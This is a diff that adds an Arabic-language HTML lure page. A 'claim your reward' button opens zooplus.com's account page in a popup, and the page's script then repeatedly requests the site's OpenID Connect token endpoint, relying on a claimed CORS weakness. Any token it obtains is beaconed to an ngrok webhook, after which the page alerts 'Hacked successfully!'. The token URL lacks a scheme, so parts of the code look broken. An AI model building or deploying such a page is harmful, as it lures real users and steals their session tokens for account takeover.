@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>اربح الآن!</title>
+    <style>
+        .btn { padding: 20px; background: red; color: white; cursor: pointer; border: none; font-size: 20px; }
+    </style>
+</head>
+<body style="text-align:center; padding-top:50px;">
+    <h1>اضغط لاستلام مكافئتك</h1>
+    <button class="btn" onclick="startAttack()">اضغط هنا</button>
+
+    <script>
+        const WEBHOOK = 'https://subsphenoidal-dauntlessly-pura.ngrok-free.dev';
+
+        function startAttack() {
+            // فتح موقع الضحية في نافذة منبثقة
+            const win = window.open('https://www.zooplus.com/account/overview', 'VictimWindow', 'width=500,height=500');
+
+            // الانتظار حتى يتم تحميل الموقع ثم محاولة سحب التوكن من الـ Headers
+            // ملاحظة: في العالم الواقعي نستخدم ثغرة CORS لإعادة توجيه الطلبات
+            const interval = setInterval(async () => {
+                try {
+                    // محاولة جلب التوكن من خلال طلب API مستغلين ضعف الـ CORS
+                    const res = await fetch('login.zooplus.com/auth/realms/zooplus/protocol/openid-connect/token', {
+                        method: 'GET',
+                        mode: 'cors'
+                    });
+                    const tokenData = await res.json();
+                    
+                    if(tokenData) {
+                        navigator.sendBeacon(WEBHOOK, JSON.stringify({
+                            event: "POPUP_CORS_STEAL",
+                            jwt: tokenData
+                        }));
+                        clearInterval(interval);
+                        alert("تم الاختراق بنجاح!");
+                    }
+                } catch(e) {
+                    // استمرار المحاولة حتى ينجح الطلب أو يغلق المستخدم النافذة
+                }
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
